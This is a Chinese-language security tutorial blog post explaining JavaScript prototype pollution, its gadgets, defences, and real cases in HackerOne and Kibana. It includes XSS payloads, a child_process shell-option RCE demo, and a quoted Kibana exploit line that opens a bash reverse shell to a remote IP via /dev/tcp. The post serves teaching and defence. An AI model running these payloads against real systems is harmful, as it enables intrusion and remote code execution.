---
title: 基於 JS 原型鏈的攻擊手法：Prototype Pollution
date: 2021-09-29
tags: [Security, Front-end]
author: huli
layout: layouts/post.njk
---

## 前言

<!-- summary -->
身為一個前端工程師，或是一個會寫 JavaScript 的人，你一定多少有聽過 prototype 這個名詞，甚至面試的時候也會考到相關的題目。

但你可能沒聽過的是，在 JavaScript 中有一種攻擊手法跟原型鏈息息相關，利用原型鏈這個功能的特性來進行攻擊——Prototype pollution，通常翻做原型鏈污染，就是這麼有趣而且破壞力十足的一個攻擊手法。
<!-- summary -->

## 原型鏈

JavaScript 中的物件導向跟其他程式語言比較不一樣，你現在看到的 `class` 那是 ES6 以後才有的語法，在這之前都是用 `prototype` 來做這件事情，又稱為原型繼承。

舉個例子好了，你有沒有想過當你在用一些內建函式的時候，這些函式是從哪裡來的？

``` js
var str = "a"
var str2 = str.repeat(5) // repeat 是哪裡來的？
```

甚至你會發現，兩個不同字串的 repeat 方法，其實是同一個 function：

``` js
var str = "a"
var str2 = "b"
console.log(str.repeat === str2.repeat) // true
```

或是如果你曾經查過 MDN，會發現標題不是 repeat，而是 `String.prototype.repeat`：

![string.prototype.repeat](/img/posts/huli/prototype-pollution/1-repeat.png)

而這一切的一切，都與 prototype 有關。

當你在呼叫 `str.repeat` 的時候，並不是 str 這個 instance 上面真的有一個方法叫做 repeat，那既然如此，JS 引擎背後是怎麼運作的？

還記得 scope 的概念嗎？假設我用了一個變數，local scope 找不到，JS 引擎就會去上一層 scope 找，然後一路找到 global scope 為止，這又稱為 scope chain，JS 引擎沿著這條鏈不斷往上尋找，直到最頂端才停下來。

Prototype chain 的概念其實是一模一樣的，但差別在於：「JS 引擎怎麼知道上一層是哪裡？」，如果 JS 引擎在 `str` 身上找不到 repeat 這個 function，那它該去哪裡找呢？

在 JS 中有一個隱藏的屬性，叫做 `__proto__`，它儲存的值就是 JS 引擎應該往上找的地方。

例如說：

``` js
var str = ""
console.log(str.__proto__) // String.prototype
```

`str.__proto__` 所指向的東西，就是 JS 引擎在 str 身上找不到東西時，應該去的「上一層」，而這個上一層會是 `String.prototype`。

這解釋了為什麼 MDN 上面不寫 repeat，而是寫 `String.prototype.repeat`，因為這才是 repeat function 的全名，這個 repeat 函式其實是存在於 `String.prototype` 這個物件上的一個方法。

因此，當你在呼叫 `str.repeat` 的時候，其實就是在呼叫 `String.prototype.repeat`，而這就是原型鏈的原理跟運作方式。

除了字串以外，其他東西也是一樣的，例如說物件：

``` js
var obj = {}
console.log(obj.a) // undefined
console.log(obj.toString) // ƒ toString() { [native code] }
```

明明 obj 就是一個空物件，為什麼 `obj.toString` 有東西？因為 JS 引擎在 obj 找不到，所以就去 `obj.__proto__` 找，而這個 `obj.__proto__` 所指向的地方是 `Object.prototype`，所以 `obj.toString` 最後找到的其實是 `Object.prototype.toString`。

``` js
var obj = {}
console.log(obj.toString === Object.prototype.toString) // true
```

## 改變預設 prototype 上的屬性

字串的 `__proto__` 會是 `String.prototype`，數字的 `__proto__` 會是 `Number.prototype`，而陣列的則是 `Array.prototype`，這些關聯都是已經預設好的了，原因就是要讓這些類別的東西可以共用同一個 function。

如果每一個字串都有自己的 `repeat`，那一百萬個字串就有一百萬個不同的 repeat，但其實做的事情都一樣，聽起來不太合理對吧？所以透過 prototype ，我們就可以把 `repeat` 放在 `String.prototype`，這樣每個字串在使用這個函式時，呼叫到的都會是同一個函式。

你可能會好奇說，既然呼叫到的是同個函式，參數也都一樣，那函式要怎麼區分出是不同的字串在呼叫它？

答案就是：this，底下直接看個例子：

``` js
String.prototype.first = function() {
  return this[0]
}

console.log("".first()) // undefined
console.log("abc".first()) // a
```

首先，我在 `String.prototype` 上面加了一個方法叫做 `first`，所以當我呼叫 `"".first` 的時候，JS 引擎沿著 `__proto__` 找到了 `String.prototype`，發現了 `String.prototype.first` 是存在的，就呼叫了這個函式。

而又因為 this 的規則，當 `"".first()` 這樣寫的時候，在 `first` 中拿到的 this 會是 `""`；若呼叫的是 `"abc".first()`，`first` 中拿到的 this 就會是 `"abc"`，因此我們可以用 this 來區分現在是誰在呼叫。

像上面那樣 `String.prototype.first` 的寫法，就是直接去修改 String 的原型，加上一個新的方法，讓所有字串都可以用到這個新的 method。雖然很方便沒錯，但是這樣的方式在開發上是不被推薦的，有一句話是這樣說的：[Don't modify objects you don't own](https://humanwhocodes.com/blog/2010/03/02/maintainable-javascript-dont-modify-objects-you-down-own/)。例如說 MooTools 就因為做了類似的事情，導致一個 array 的 method 要換名稱，詳情請看我以前寫過的：[Don’t break the Web：以 SmooshGate 以及 <keygen> 為例](https://blog.huli.tw/2019/11/26/dont-break-web-smooshgate-and-keygen/)。

然後，既然 `String.prototype` 可以修改，那理所當然 `Object.prototype` 也可以修改，像是這樣：

``` js
Object.prototype.a = 123
var obj = {}
console.log(obj.a) // 123
```

因為修改了 `Object.prototype` 的緣故，所以在存取 `obj.a` 的時候，JS 引擎在 obj 身上找不到 a 這個屬性，於是去 `obj.__proto__` 也就是 `Object.prototype` 找，在那上面找到了 a，於是就回傳這個 a 的值。

當程式出現漏洞，導致可以被攻擊者拿去改變原型鏈上的屬性，就叫做 prototype pollution。Pollution 是污染的意思，就像上面這個 object 的例子，我們透過 `Object.prototype.a = 123` 「污染」了物件原型上的 `a` 這個屬性，導致程式在存取物件時，有可能出現意想不到的行為。

那這會造成什麼後果呢？

## 污染了屬性以後可以幹嘛？

假設今天網站上有個搜尋功能，會從 query string 裡面拿 `q` 的值，然後寫到畫面上去，呈現出來像是這樣：

![search](/img/posts/huli/prototype-pollution/2-search.png)

而整段程式碼是這樣寫的：

``` js
// 從網址列上拿到 query string
var qs = new URLSearchParams(location.search.slice(1))

// 放上畫面，為了避免 XSS 用 innerText
document.body.appendChild(createElement({
  tag: 'h2',
  innerText: `Search result for ${qs.get('q')}`
}))

// 簡化建立元件用的函式
function createElement(config){
  const element = document.createElement(config.tag)
  if (config.innerHTML) {
    element.innerHTML = config.innerHTML
  } else {
    element.innerText = config.innerText
  }
  return element
}
```

上面這段程式碼應該沒什麼問題對吧？我們寫了一個 function `createElement` 幫我們簡化一些步驟，根據傳進來的 config 決定要產生什麼元件。為了避免 XSS，所以我們用 `innerText` 而不是 `innerHTML`，萬無一失，絕對不會有 XSS！

看起來是這樣沒錯，但如果在執行到這一段程式碼以前有個 prototype pollution 的漏洞，能讓攻擊者污染到原型上的屬性呢？例如說像是這樣：

``` js
// 先假設可以污染原型上的屬性
Object.prototype.innerHTML = '<img src=x onerror=alert(1)>'

// 底下都跟剛剛一樣
var qs = new URLSearchParams(location.search.slice(1))

document.body.appendChild(createElement({
  tag: 'h2',
  innerText: `Search result for ${qs.get('q')}`
}))

function createElement(config){
  const element = document.createElement(config.tag)
  // 這一行因為原型鏈被污染，所以 if(config.innerHTML) 的結果會是 true
  if (config.innerHTML) {
    element.innerHTML = config.innerHTML
  } else {
    element.innerText = config.innerText
  }
  return element
}
```

整份程式碼只差在開頭，多了一個 `Object.prototype.innerHTML = '<img src=x onerror=alert(1)>'`，而就因為這一行污染了 innerHTML，導致底下 `if (config.innerHTML) {` 的判斷變成 true，行為被改變，原本是用 `innerText`，現在改成用 `innerHTML`，最後就達成了 XSS！

這就是由 prototype pollution 所引發的 XSS 攻擊。一般來說，prototype pollution 指的是程式有漏洞，導致攻擊者可以污染原型鏈上的屬性，但是除了污染以外，還必須找到可以影響的地方，加在一起才能形成完整的攻擊。

此時的你應該很好奇，那到底怎樣的程式碼會有漏洞，居然能讓攻擊者去改原型鏈上的屬性。

## Prototype pollution 是怎麼發生的？

有兩個例子很常發生這種事情，第一個是解析 query string。

你可能想說 query string 不就 `?a=1&b=2` 這種類型，有什麼難的？但其實許多函式庫的 query string 都有支援陣列，像是 `?a=1&a=2` 或是 `?a[]=1&a[]=2` 都有可能被解析為陣列。

除了陣列以外，有些甚至還支援物件，像是這樣：`?a[b][c]=1`，就會產生一個 `{a: {b: {c: 1}}}` 的物件出來。

舉例來說，[qs](https://github.com/ljharb/qs#parsing-objects) 這個 library 就有支援物件的解析。

今天如果是你要來負責這個功能，你會怎麼寫呢？我們可以寫一個只針對物件的陽春版本（先不考慮 URL encode 的情況，也不考慮陣列）：

``` js
function parseQs(qs) {
  let result = {}
  let arr = qs.split('&')
  for(let item of arr) {
    let [key, value] = item.split('=')
    if (!key.endsWith(']')) {
      // 針對一般的 key=value
      result[key] = value
      continue
    }

    // 針對物件
    let items = key.split('[')
    let obj = result
    for(let i = 0; i < items.length; i++) {
      let objKey = items[i].replace(/]$/g, '')
      if (i === items.length - 1) {
        obj[objKey] = value
      } else {
        if (typeof obj[objKey] !== 'object') {
          obj[objKey] = {}
        }
        obj = obj[objKey]
      }
    }
  }
  return result
}

var qs = parseQs('test=1&a[b][c]=2')
console.log(qs)
// { test: '1', a: { b: { c: '2' } } }
```

基本上就是根據 `[]` 裡面的內容去構造出一個物件，一層一層去賦值，看起來沒什麼特別的。

但是！如果我的 query string 長這樣，事情就不一樣了：

``` js
var qs = parseQs('__proto__[a]=3')
console.log(qs) // {}

var obj = {}
console.log(obj.a) // 3
```

當我的 query string 是這樣的時候，`parseQs` 就會去改變 `obj.__proto__.a` 的值，造成了 prototype pollution，導致我後來宣告一個空的物件，在印出 `obj.a` 的時候卻印出了 3，因為物件原型已經被污染了。

有不少在解析 query string 的 library 都出過類似的問題，底下簡單舉幾個例子：

1. [jquery-deparam](https://snyk.io/vuln/SNYK-JS-JQUERYDEPARAM-1255651)
2. [backbone-query-parameters](https://snyk.io/vuln/SNYK-JS-BACKBONEQUERYPARAMETERS-1290381)
3. [jquery-query-object](https://snyk.io/vuln/SNYK-JS-JQUERYQUERYOBJECT-1255650)

除了解析 query string 以外，另一個功能也很常發生這個問題，叫做合併物件，一個簡單的合併物件函式長得像這樣：

``` js
function merge(a, b) {
  for(let prop in b) {
    if (typeof a[prop] === 'object') {
      merge(a[prop], b[prop])
    } else {
      a[prop] = b[prop]
    }
  } 
}

var config = {
  a: 1,
  b: {
    c: 2
  }
}

var customConfig = {
  b: {
    d: 3
  }
}

merge(config, customConfig)
console.log(config)
// { a: 1, b: { c: 2, d: 3 } }
```

如果上面的 `customConfig` 是可以控制的，那就會發生問題：

``` js
var config = {
  a: 1,
  b: {
    c: 2
  }
}

var customConfig = JSON.parse('{"__proto__": {"a": 1}}')
merge(config, customConfig)

var obj = {}
console.log(obj.a)
```

這邊之所以用到 `JSON.parse`，是因為如果直接寫：

``` js
var customConfig = {
  __proto__: {
    a: 1
  }
}
```

是沒有用的，`customConfig` 只會是一個空物件而已。要用 `JSON.parse`，才能製造出一個「key 是 `__proto__`」的物件：

``` js
var obj1 = {
  __proto__: {
    a: 1
  }
}
var obj2 = JSON.parse('{"__proto__": {"a": 1}}')
console.log(obj1) // {}
console.log(obj2) // { __proto__: { a: 1 } }
```

同樣地，也有許多 merge 相關的 library 曾經有這個漏洞，底下簡單列舉幾個：

1. [merge](https://snyk.io/vuln/SNYK-JS-MERGE-1040469)
2. [lodash.merge](https://snyk.io/vuln/SNYK-JS-LODASHMERGE-173733)
3. [plain-object-merge ](https://snyk.io/vuln/SNYK-JS-PLAINOBJECTMERGE-1085643)

除了這些以外，只要是操作物件相關的 library 基本上都出現過類似問題，像是：

1. [immer](https://snyk.io/vuln/SNYK-JS-IMMER-1019369)
2. [mootools](https://snyk.io/vuln/SNYK-JS-MOOTOOLS-1325536)
3. [ioredis](https://snyk.io/vuln/SNYK-JS-IOREDIS-1567196)

現在已經知道哪些地方容易發生 prototype pollution 的問題了，但如果只是污染原型上的屬性，是沒有用的，還需要找到能影響到的地方，也就是說，有哪些地方在屬性被污染以後，行為會改變，可以讓我們執行攻擊？

## Prototype pollution script gadgets

這些「只要我們污染了 prototype，就可以拿來利用的程式碼」叫做 script gadget，有一個 GitHub repo 專門搜集了這些 gadget：[Client-Side Prototype Pollution](https://github.com/BlackFan/client-side-prototype-pollution)，有些 gadget 可能是你想像不到的，我來示範一下（[demo 網頁](https://aszx87410.github.io/demo/prototype-pollution/vue.html)）：

``` html
<!DOCTYPE html>

<html lang="en">
<head>
  <meta charset="utf-8">
  <script src="https://unpkg.com/vue/dist/vue.js"></script>
</head>
<body>
  <div id="app">
    {{ message }}
  </div>
  <script>
    // 污染 template
    Object.prototype.template = '<svg onload=alert(1)></svg>';
    var app = new Vue({ 
      el: '#app',
      data: {
        message: 'Hello Vue!'
      }
    });
  </script>
</body>
</html>
```

一段看起來沒什麼的 Vue hello world，在我們污染了 `Object.prototype.template` 之後，就變成了 XSS，可以讓我們插入任意程式碼。

或是像下面這樣（[demo 網頁](https://aszx87410.github.io/demo/prototype-pollution/vue.html)）：

``` html
<!DOCTYPE html>

<html lang="en">
<head>
  <meta charset="utf-8">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/sanitize-html/1.27.5/sanitize-html.min.js"></script>
</head>
<body>
  <script>
    Object.prototype.innerText = '<svg onload=alert(1)></svg>';
    document.write(sanitizeHtml('<div>hello</div>'))
  </script>
</body>
</html>
```

明明是做 sanitize 的 library，在污染了 `Object.prototype.innerText` 之後，就變成了 XSS 的好幫手。

為什麼會有這些問題出現呢？以上面的 `sanitize-html` 為例，是因為有這一段程式碼：

``` js
if (frame.innerText && !hasText && !options.textFilter) {
    result += frame.innerText;
}
```

因為直接預設了 innerText 是安全的字串，所以就直接拼接上去，而我們污染了這個屬性，因此當這個屬性不存在時，就會用到 prototype 的值，最後變成了 XSS。

除了 client side 以外，server side 的 Node.js 也有類似的風險，例如說這樣：

``` js
const child_process = require('child_process')
const params = ['123']
const result = child_process.spawnSync(
  'echo', params
);
console.log(result.stdout.toString()) // 123
```

這是一段很單純的程式碼，執行 `echo` 指令然後傳入參數，這個參數會自動幫你做處理，所以不用擔心 command injection 的問題：

``` js
const child_process = require('child_process')
const params = ['123 && ls']
const result = child_process.spawnSync(
  'echo', params
);
console.log(result.stdout.toString()) // 123 && ls
```

但如果有一個 prototype pollution 的漏洞，就可以搖身一變成為 RCE（Remote code execution），讓攻擊者執行任意指令（假設攻擊者可以控制 params）：

``` js
const child_process = require('child_process')
const params = ['123 && ls']
Object.prototype.shell = true // 只多了這行，參數的解析就會不一樣
const result = child_process.spawnSync(
  'echo', params, {timeout: 1000}
);
console.log(result.stdout.toString())
/*
123
index.js
node_modules
package-lock.json
package.json
*/
```

之所以會這樣，是因為 `child_process.spawn` 的第三個參數 options 中有一個選項叫做 `shell`，設為 true 以後會造成行為不同，而官網的[文件](https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options)也有寫說：

> If the shell option is enabled, do not pass unsanitized user input to this function. Any input containing shell metacharacters may be used to trigger arbitrary command execution.

透過 prototype pollution 搭配 script gadget（`child_process.spawn`），成功製造出一個嚴重性極高的漏洞。

## 中場總結

如果程式中存在某個功能，能讓攻擊者污染到 prototype 上面的屬性，這個漏洞就叫做 prototype pollution，而 prototype pollution 本身用途不大，需要跟其他的程式碼結合才能發揮作用，而可以跟他結合的程式碼就叫做 script gadget。

例如說 Vue 的內部實作會根據某個物件的 `template` 這個屬性渲染出相對應的東西，於是我們只要污染 `Object.prototype.template`，就可以製造出一個 XSS 漏洞。或像是 `child_process.spawn` 用到了 `shell`，所以污染它以後就變成了 RCE 漏洞。

要修復的其實並不是那些可以利用的 script gadget，除非你把每個物件取值的地方都改掉，但這其實也不是根治的方式。真正根治的方式，是杜絕掉 prototype pollution，讓 prototype 不會被污染，就沒有這些問題了。

## 該如何防禦

常見的防禦方式有幾種，第一種是在做這些物件的操作時，阻止 `__proto__` 這個 key，例如說前面提到的解析 query string 跟 merge object 都可以採用這個方式。

但是除了 `__proto__` 以外，也要注意另外一種繞過方式，像這樣：

``` js
var obj = {}
obj['constructor']['prototype']['a'] = 1
var obj2 = {}
console.log(obj2.a) // 1
```

用 `constructor.prototype` 也可以去污染原型鏈上的屬性，所以要把這幾種一起封掉才安全。

像是 [lodash.merge](https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad) 的 prototype pollution 就是用這種方式修復的，當 key 是 `__proto__` 或是 `prototype` 的時候會做特殊處理。

第二種方式簡單易懂，就是不要用 object 了，或更精確地說，「不要用有 prototype 的 object」。

有些人可能看過一種建立物件的方式，是這樣的：`Object.create(null)`，這樣可以建立出一個沒有 `__proto__` 屬性的空物件，就是真的空物件，任何的 method 都沒有。也因為這樣，所以就不會有 prototype pollution 的問題：

``` js
var obj = Object.create(null)
obj['__proto__']['a'] = 1 // 根本沒有 __proto__ 這個屬性
// TypeError: Cannot set property 'a' of undefined
```

像是開頭提到的解析 query string 的 library，其實已經用了這種方式來防禦，像是每週下載次數高達 1 千萬次的 [query-string](https://www.npmjs.com/package/query-string)，[文件](https://github.com/sindresorhus/query-string#parsestring-options)上面就寫了：

> .parse(string, options?)
> Parse a query string into an object. Leading ? or # are ignored, so you can pass location.search or location.hash directly.
>  
> The returned object is created with Object.create(null) and thus does not have a prototype.

其他還有像是 `Object.freeze(Object.prototype)`，把 prototype 凍結住就改不了了，或者是用 `Map` 來取代 `{}` 之類的，但我覺得這兩種可能都會有一些副作用，例如說前者如果真的需要改或者是某個 library 有改的話，就爆炸了，而後者我覺得 `Object.create(null)` 會比 `Map` 好用，所以這兩種我就不多提了。

至於 Node.js，還可以使用 `--disable-proto` 這個 option 來把 `Object.prototype.__proto__` 關掉，詳情可以參考[官方文件](https://nodejs.org/api/cli.html#cli_disable_proto_mode)

或是未來也有可能使用 document policy 做處理，可以關注這個 issue： [Feature proposal: Mitigation for Client-Side Prototype Pollution](https://github.com/WICG/document-policy/issues/33)

## 實際案例

最後我們來看兩個 prototype pollution 的真實案例，讓大家更有感覺一點。

第一個案例是知名 bug bounty 平台 hackerone 的漏洞（對，就是 bug bounty 平台本身的漏洞），完整報告在這裡：[#986386 Reflected XSS on www.hackerone.com via Wistia embed code](https://hackerone.com/reports/986386)

在網站上他們用了一個第三方套件，而在這個第三方套件裡面有一段程式碼長這樣：

``` js
i._initializers.initWLog = function() {
    var e, t, n, o, a, l, s, d, u, p, c;
    if (t = i.url.parse(location.href),
    document.referrer && (u = i.url.parse(document.referrer)),
``` 

它會去解析 `location.href` 跟 `document.referrer`，這兩者都是攻擊者可控的，然後 `i.url.parse` 這個 function 有著 prototype pollution 的漏洞，所以可以污染任意屬性。

污染之後，作者發現了另外一段程式碼，這一段程式碼跟我們前面寫過的 `createElement` 有異曲同工之妙，`fromObject` 會去遍歷屬性然後放到 DOM 上：

``` js
if (this.chrome = r.elem.fromObject({
    id: r.seqId('wistia_chrome_'),
    class: 'w-chrome',
    style: r.generate.relativeBlockCss(),
    tabindex: -1
})
```

所以只要污染 `innerHTML`，就可以利用這個 script gadget 製造出一個 XSS 漏洞。實際的攻擊方式就是構造出一個能夠觸發 prototype pollution + XSS 的網址，只要把網址傳給別人，點開以後就會直接遭受到攻擊。

這攻擊後半段還有繞過 CSP 的段落，用的是之前我在 [從 cdnjs 的漏洞來看前端的供應鏈攻擊與防禦](https://tech-blog.cymetrics.io/posts/huli/front-end-supply-chain-attack-cdnjs/)中有提過的技巧。

另一個案例是 Kibana 的漏洞，原始文章在這裡：[Exploiting prototype pollution – RCE in Kibana (CVE-2019-7609)](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)，官方對於這個漏洞的描述是這樣的：

> An attacker with access to the Timelion application could send a request that will attempt to execute javascript code. This could possibly lead to an attacker executing arbitrary commands with permissions of the Kibana process on the host system.

在 Kibana 裡面有一個 Timelion 的功能，可以自己輸入語法並且畫成圖表，而下面這一段語法可以污染 prototype：

``` js
.es.props(label.__proto__.x='ABC')
```

污染 prototype 只是第一步，下一步是要找出 script gadget，kibana 中的其中一段程式碼長這樣子：

``` js
  var env = options.env || process.env;
  var envPairs = [];

  for (var key in env) {
    const value = env[key];
    if (value !== undefined) {
      envPairs.push(`${key}=${value}`);
    }
  }
```

這一段會來拿構造環境變數，而這個環境變數會用來跑新的 node process，例如說 envPairs 如果是 `a=1` 的話，應該就會跑 `a=1 node xxx.js` 這個指令。

既然是跑 node.js，我們可以利用 `NODE_OPTIONS` 這個環境變數來偷偷引入檔案：

``` js
// a.js
console.log('a.js')

// b.js
console.log('b.js')

// 跑這個指令，用環境變數引入 a.js
NODE_OPTIONS="--require ./a.js" node b.js

// 輸出
a.js
b.js
```

所以，如果我們可以上傳一個 js 檔案，就可以搭配 prototype pollution 去執行這個檔案了。聽起來有點麻煩，有其他方法嗎？

有！有一個滿常用的技巧是有些檔案的內容其實是可控的，例如說 PHP 中的 session 內容就有機會控制，可參考這一篇：[透過 LFI 引入 PHP session 檔案觸發 RCE](https://kb.hitcon.org/post/165429468072/%E9%80%8F%E9%81%8E-lfi-%E5%BC%95%E5%85%A5-php-session-%E6%AA%94%E6%A1%88%E8%A7%B8%E7%99%BC-rce)，而另一個 Linux 系統中的檔案 `/proc/self/environ` 則是會有現在的 process 的所有環境變數。

如果我們建立一個環境變數叫做 `A=console.log(123)//`，`/proc/self/environ` 的內容就會變為：

``` js
A=console.log(123)//YARN_VERSION=1.1PWD=/userLANG=en_US.UTF-8....
```

就變成了合法的 JS 程式碼！

於是就可以利用這樣的方式去執行它：

``` js
NODE_OPTIONS="--require /proc/self/environ" A='console.log(1)//' node b.js
```

作者最後給出的 code 長這樣：

``` js
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

污染了兩個不同的屬性，創造了兩個環境變數，一個用來把 `/proc/self/environ` 變成合法的 JS 並且包含了要執行的程式碼，另一個 `NODE_OPTIONS` 則透過 `--require` 去引入 `/proc/self/environ`，最後就串成了可以執行任意程式碼的 RCE 漏洞！

## 結語

我自己在接觸資安以前，是沒有聽過 prototype pollution 的。

因此當我第一次接觸到 prototype pollution 這個漏洞的時候，我覺得有些驚訝。我驚訝的點在於，為什麼我從來沒聽過這個？比起前端常見的漏洞像是 XSS 或是 CSRF 等等，prototype pollution 的知名度似乎低了許多。

有些人第一次看到這名詞可能是因為某個 NPM 的 package 有這個漏洞，升級版本以後就修掉了，但可能沒有去理解這個漏洞的成因以及可能的影響。

我自己其實滿愛這個漏洞的，第一是我覺得成因很有趣，第二是我覺得尋找 script gadget 也很有趣。總之呢，希望能藉由這篇文章，讓更多前端工程師認識到這個漏洞，並且知道它的原理以及防禦方式。

最後推薦大家一篇超讚的文章，透過自動化的方式去檢測 prototype pollution 漏洞，並且找出發生問題的地方，我覺得把 prototype pollution 又提升到了另一個境界：[A tale of making internet pollution free - Exploiting Client-Side Prototype Pollution in the wild](https://blog.s1r1us.ninja/research/PP)
